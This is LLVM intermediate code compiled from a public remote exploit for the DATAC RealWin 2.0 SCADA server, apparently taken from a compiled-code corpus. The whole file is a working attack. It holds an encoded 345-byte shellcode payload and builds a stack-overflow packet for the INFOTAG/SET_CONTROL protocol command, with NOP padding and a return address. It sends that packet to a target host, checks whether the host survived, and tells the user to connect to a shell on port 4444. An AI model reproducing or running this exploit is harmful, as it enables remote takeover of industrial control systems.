; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_32426.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_32426.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i8*, i32 }
%struct.sockaddr_in = type { %struct.TYPE_3__, i32, i32 }
%struct.TYPE_3__ = type { i32 }
%struct.sockaddr = type { i32 }

@__const.main.scode = private unnamed_addr constant [345 x i8] c")\C9\83\E9\B0\D9\EE\D9t$\F4[\81s\13\A5\D8\FB\1B\83\EB\FC\E2\F4Y\B2\10VM!\04\E4Z\B8pw\81\FCp^\99S\87\1E\DD\D9\14\90\EA\C0pD\85\D9\10R.\ECp\1AK\E9;\82\09\\;o\A2\191\16\A4\1A\10\EF\9E\8C\DF3\D0=pD\81\D9\10}.\D4\B0\90\FA\C4\FA\F0\A6\F4p\92\C9\FC\E7zf\E9 \7F.\9B\CB\90\E5\D4pk\B9up[\AD\86\93\95\EB\D6\17KZ\0E\9DH\C3\B0\C8)\CD\AF\88)\FA\8C\04\CB\CD\13\16\E7\9E\88\04\CD\FAQ\1E}$5\F3\19\F0\B2\F9\E4u\B0\22\12Pu\AC\E4s\8B\A8H\F6\8B\B8H\E6\8B\04\CB\C3\B0\EAG\C3\8Br\FA0\B0_\01\D5\1F\AC\E4s\B2\EBJ\F0'+s\01u\D5\F2\F2'-H\F0'+s@\91}R\F2'-K\F1\8C\AE\E4uK\93\FC\DC\1E\82LZ\0E\AE\E4u\BE\91\7F\C3\B0\98v,=\91K\FC\F17\92B\B2\BF\92G\E9;\E8\0F&\B96[\9A\D7\88(\A2\C3\B0\0Es\93i[k\ED\E4\D0\9C\04\CD\FE\8F\A9J\F4\89\91\1A\F4\89\AEJZ\08\93\B6|\DD5HZ\0E\91\E4Z\EF\04\CB.\8F\07\98a\BC\04\CD\F7'+sJ\16\1B{\F6'-\E4u\D8\FB\1B\00", align 16
@.str = private unnamed_addr constant [4 x i8] c"cls\00", align 1
@.str.1 = private unnamed_addr constant [41 x i8] c"\0A\09\09- DATAC RealWin 2.0 SCADA Software -\0A\00", align 1
@.str.2 = private unnamed_addr constant [54 x i8] c"\09Protocol Command INFOTAG/SET_CONTROL Stack Overflow\0A\00", align 1
@.str.3 = private unnamed_addr constant [39 x i8] c"\0ARuben Santamarta - reversemode.com \0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [36 x i8] c"\0Ausage: exploit.exe ip TargetNumber\00", align 1
@.str.5 = private unnamed_addr constant [36 x i8] c"\0A\0Aexample: exploit 192.168.1.44 1\0A\0A\00", align 1
@targets = common dso_local global %struct.TYPE_4__* null, align 8
@.str.6 = private unnamed_addr constant [13 x i8] c"\0A[ %d ] - %s\00", align 1
@.str.7 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@REALWIN_PORT = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [29 x i8] c"\0A[!!] Host unreachable :( \0A\0A\00", align 1
@EXPLOIT_LEN = common dso_local global i32 0, align 4
@PING_LEN = common dso_local global i32 0, align 4
@PACKET_HEADER_MAGIC = common dso_local global i32 0, align 4
@FUNC_INFOTAG_SET_CONTROL = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [58 x i8] c"[+] Exploit packet sent...now checking host availability\0A\00", align 1
@FUNC_PING = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [44 x i8] c"\0A[!!] Host died, long live to the Host!  \0A\0A\00", align 1
@.str.11 = private unnamed_addr constant [55 x i8] c"[+] The host is up and running\0A\09:: %d bytes received: \00", align 1
@.str.12 = private unnamed_addr constant [6 x i8] c"%02X \00", align 1
@.str.13 = private unnamed_addr constant [27 x i8] c"\0A[+] Try: telnet %s 4444\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [16 x i8], align 16
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca [345 x i8], align 16
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %17 = bitcast [16 x i8]* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %17, i8 0, i64 16, i1 false)
  store i8* null, i8** %11, align 8
  store i8* null, i8** %12, align 8
  %18 = bitcast [345 x i8]* %14 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %18, i8* align 16 getelementptr inbounds ([345 x i8], [345 x i8]* @__const.main.scode, i32 0, i32 0), i64 345, i1 false)
  %19 = call i32 @system(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.1, i64 0, i64 0))
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.2, i64 0, i64 0))
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.3, i64 0, i64 0))
  %23 = load i32, i32* %4, align 4
  %24 = icmp slt i32 %23, 3
  br i1 %24, label %25, label %51

25:                                               ; preds = %2
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.4, i64 0, i64 0))
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.5, i64 0, i64 0))
  store i32 0, i32* %15, align 4
  br label %28

28:                                               ; preds = %45, %25
  %29 = load %struct.TYPE_4__*, %struct.TYPE_4__** @targets, align 8
  %30 = load i32, i32* %15, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %29, i64 %31
  %33 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %32, i32 0, i32 0
  %34 = load i8*, i8** %33, align 8
  %35 = icmp ne i8* %34, null
  br i1 %35, label %36, label %48

36:                                               ; preds = %28
  %37 = load i32, i32* %15, align 4
  %38 = load %struct.TYPE_4__*, %struct.TYPE_4__** @targets, align 8
  %39 = load i32, i32* %15, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %38, i64 %40
  %42 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %41, i32 0, i32 0
  %43 = load i8*, i8** %42, align 8
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.6, i64 0, i64 0), i32 %37, i8* %43)
  br label %45

45:                                               ; preds = %36
  %46 = load i32, i32* %15, align 4
  %47 = add nsw i32 %46, 1
  store i32 %47, i32* %15, align 4
  br label %28

48:                                               ; preds = %28
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0))
  %50 = call i32 @exit(i32 0) #4
  unreachable

51:                                               ; preds = %2
  %52 = call i32 @WSAStartup(i32 514, i32* %6)
  %53 = load i32, i32* @AF_INET, align 4
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  store i32 %53, i32* %54, align 4
  %55 = load i32, i32* @REALWIN_PORT, align 4
  %56 = call i32 @htons(i32 %55)
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i32 %56, i32* %57, align 4
  %58 = load i8**, i8*** %5, align 8
  %59 = getelementptr inbounds i8*, i8** %58, i64 1
  %60 = load i8*, i8** %59, align 8
  %61 = call i32 @inet_addr(i8* %60)
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  %63 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %62, i32 0, i32 0
  store i32 %61, i32* %63, align 4
  %64 = load i32, i32* @AF_INET, align 4
  %65 = load i32, i32* @SOCK_STREAM, align 4
  %66 = call i32 @socket(i32 %64, i32 %65, i32 0)
  store i32 %66, i32* %7, align 4
  %67 = load i32, i32* %7, align 4
  %68 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %69 = call i64 @connect(i32 %67, %struct.sockaddr* %68, i32 4)
  %70 = icmp ne i64 %69, 0
  br i1 %70, label %71, label %74

71:                                               ; preds = %51
  %72 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.8, i64 0, i64 0))
  %73 = call i32 @exit(i32 0) #4
  unreachable

74:                                               ; preds = %51
  %75 = load i32, i32* @EXPLOIT_LEN, align 4
  %76 = call i64 @calloc(i32 %75, i32 1)
  %77 = inttoptr i64 %76 to i8*
  store i8* %77, i8** %11, align 8
  %78 = load i32, i32* @PING_LEN, align 4
  %79 = call i64 @calloc(i32 %78, i32 1)
  %80 = inttoptr i64 %79 to i8*
  store i8* %80, i8** %12, align 8
  %81 = load i8*, i8** %11, align 8
  %82 = load i32, i32* @EXPLOIT_LEN, align 4
  %83 = call i32 @memset(i8* %81, i32 144, i32 %82)
  %84 = load i8*, i8** %12, align 8
  %85 = load i32, i32* @PING_LEN, align 4
  %86 = call i32 @memset(i8* %84, i32 144, i32 %85)
  %87 = load %struct.TYPE_4__*, %struct.TYPE_4__** @targets, align 8
  %88 = load i8**, i8*** %5, align 8
  %89 = getelementptr inbounds i8*, i8** %88, i64 2
  %90 = load i8*, i8** %89, align 8
  %91 = call i64 @atoi(i8* %90)
  %92 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %87, i64 %91
  %93 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %92, i32 0, i32 1
  %94 = load i32, i32* %93, align 8
  store i32 %94, i32* %13, align 4
  store i32 0, i32* %15, align 4
  br label %95

95:                                               ; preds = %107, %74
  %96 = load i32, i32* %15, align 4
  %97 = icmp slt i32 %96, 190
  br i1 %97, label %98, label %110

98:                                               ; preds = %95
  %99 = load i32, i32* %13, align 4
  %100 = load i8*, i8** %11, align 8
  %101 = load i32, i32* %15, align 4
  %102 = sext i32 %101 to i64
  %103 = mul i64 %102, 4
  %104 = getelementptr inbounds i8, i8* %100, i64 %103
  %105 = getelementptr inbounds i8, i8* %104, i64 2
  %106 = bitcast i8* %105 to i32*
  store i32 %99, i32* %106, align 4
  br label %107

107:                                              ; preds = %98
  %108 = load i32, i32* %15, align 4
  %109 = add nsw i32 %108, 1
  store i32 %109, i32* %15, align 4
  br label %95

110:                                              ; preds = %95
  %111 = load i8*, i8** %11, align 8
  %112 = getelementptr inbounds i8, i8* %111, i64 760
  %113 = getelementptr inbounds i8, i8* %112, i64 2
  %114 = bitcast i8* %113 to i32*
  store i32 4210752, i32* %114, align 4
  %115 = load i32, i32* @PACKET_HEADER_MAGIC, align 4
  %116 = load i8*, i8** %11, align 8
  %117 = bitcast i8* %116 to i32*
  store i32 %115, i32* %117, align 4
  %118 = load i8*, i8** %11, align 8
  %119 = bitcast i8* %118 to i32*
  %120 = getelementptr inbounds i32, i32* %119, i64 1
  store i32 2048, i32* %120, align 4
  %121 = load i32, i32* @FUNC_INFOTAG_SET_CONTROL, align 4
  %122 = load i8*, i8** %11, align 8
  %123 = bitcast i8* %122 to i32*
  %124 = getelementptr inbounds i32, i32* %123, i64 10
  store i32 %121, i32* %124, align 4
  %125 = load i8*, i8** %11, align 8
  %126 = bitcast i8* %125 to i32*
  %127 = getelementptr inbounds i32, i32* %126, i64 14
  store i32 4, i32* %127, align 4
  %128 = load i8*, i8** %11, align 8
  %129 = bitcast i8* %128 to i32*
  %130 = getelementptr inbounds i32, i32* %129, i64 44
  store i32 -559038737, i32* %130, align 4
  %131 = load i8*, i8** %11, align 8
  %132 = load i32, i32* @EXPLOIT_LEN, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds i8, i8* %131, i64 %133
  %135 = getelementptr inbounds i8, i8* %134, i64 -345
  %136 = getelementptr inbounds [345 x i8], [345 x i8]* %14, i64 0, i64 0
  %137 = call i32 @memcpy(i8* %135, i8* %136, i32 344)
  %138 = load i32, i32* %7, align 4
  %139 = load i8*, i8** %11, align 8
  %140 = load i32, i32* @EXPLOIT_LEN, align 4
  %141 = call i32 @send(i32 %138, i8* %139, i32 %140, i32 0)
  %142 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.9, i64 0, i64 0))
  %143 = load i32, i32* @PACKET_HEADER_MAGIC, align 4
  %144 = load i8*, i8** %12, align 8
  %145 = bitcast i8* %144 to i32*
  store i32 %143, i32* %145, align 4
  %146 = load i8*, i8** %12, align 8
  %147 = bitcast i8* %146 to i32*
  %148 = getelementptr inbounds i32, i32* %147, i64 1
  store i32 32, i32* %148, align 4
  %149 = load i32, i32* @FUNC_PING, align 4
  %150 = load i8*, i8** %12, align 8
  %151 = bitcast i8* %150 to i32*
  %152 = getelementptr inbounds i32, i32* %151, i64 10
  store i32 %149, i32* %152, align 4
  %153 = load i8*, i8** %12, align 8
  %154 = bitcast i8* %153 to i32*
  %155 = getelementptr inbounds i32, i32* %154, i64 14
  store i32 1, i32* %155, align 4
  %156 = load i8*, i8** %12, align 8
  %157 = bitcast i8* %156 to i32*
  %158 = getelementptr inbounds i32, i32* %157, i64 44
  store i32 -559038737, i32* %158, align 4
  %159 = load i32, i32* @AF_INET, align 4
  %160 = load i32, i32* @SOCK_STREAM, align 4
  %161 = call i32 @socket(i32 %159, i32 %160, i32 0)
  store i32 %161, i32* %8, align 4
  %162 = load i32, i32* %8, align 4
  %163 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %164 = call i64 @connect(i32 %162, %struct.sockaddr* %163, i32 4)
  %165 = icmp ne i64 %164, 0
  br i1 %165, label %166, label %169

166:                                              ; preds = %110
  %167 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.10, i64 0, i64 0))
  %168 = call i32 @exit(i32 0) #4
  unreachable

169:                                              ; preds = %110
  %170 = load i32, i32* %8, align 4
  %171 = getelementptr inbounds [16 x i8], [16 x i8]* %9, i64 0, i64 0
  %172 = call i32 @recv(i32 %170, i8* %171, i32 8, i32 0)
  store i32 %172, i32* %15, align 4
  %173 = load i32, i32* %15, align 4
  %174 = icmp ne i32 %173, 0
  br i1 %174, label %175, label %194

175:                                              ; preds = %169
  %176 = load i32, i32* %15, align 4
  %177 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.11, i64 0, i64 0), i32 %176)
  store i32 0, i32* %16, align 4
  br label %178

178:                                              ; preds = %189, %175
  %179 = load i32, i32* %16, align 4
  %180 = load i32, i32* %15, align 4
  %181 = icmp slt i32 %179, %180
  br i1 %181, label %182, label %192

182:                                              ; preds = %178
  %183 = load i32, i32* %16, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds [16 x i8], [16 x i8]* %9, i64 0, i64 %184
  %186 = load i8, i8* %185, align 1
  %187 = zext i8 %186 to i32
  %188 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i64 0, i64 0), i32 %187)
  br label %189

189:                                              ; preds = %182
  %190 = load i32, i32* %16, align 4
  %191 = add nsw i32 %190, 1
  store i32 %191, i32* %16, align 4
  br label %178

192:                                              ; preds = %178
  %193 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0))
  br label %196

194:                                              ; preds = %169
  %195 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.10, i64 0, i64 0))
  br label %196

196:                                              ; preds = %194, %192
  %197 = load i32, i32* %8, align 4
  %198 = call i32 @closesocket(i32 %197)
  %199 = load i32, i32* %7, align 4
  %200 = call i32 @closesocket(i32 %199)
  %201 = call i32 @Sleep(i32 1000)
  %202 = load i8**, i8*** %5, align 8
  %203 = getelementptr inbounds i8*, i8** %202, i64 1
  %204 = load i8*, i8** %203, align 8
  %205 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.13, i64 0, i64 0), i8* %204)
  %206 = call i32 (...) @WSACleanup()
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @system(i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @WSAStartup(i32, i32*) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @inet_addr(i8*) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i64 @calloc(i32, i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i64 @atoi(i8*) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #2

declare dso_local i32 @closesocket(i32) #2

declare dso_local i32 @Sleep(i32) #2

declare dso_local i32 @WSACleanup(...) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
